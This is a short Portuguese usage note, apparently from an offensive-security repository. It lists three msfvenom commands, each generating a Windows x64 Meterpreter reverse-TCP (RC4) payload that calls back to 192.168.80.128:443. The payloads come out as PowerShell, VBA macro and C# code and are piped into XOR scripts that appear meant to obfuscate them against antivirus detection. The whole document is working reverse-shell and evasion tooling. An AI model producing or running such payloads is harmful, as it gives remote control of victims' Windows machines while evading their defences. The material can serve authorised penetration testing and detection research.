# Modo de uso dos scripst
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f ps1 EXITFUNC=thread | python xor_ps1.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f vbapplication EXITFUNC=thread | python xor_vba.py

$ msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=password LHOST=192.168.80.128 LPORT=443 -f csharp EXITFUNC=thread | python xor_csharp.py

```
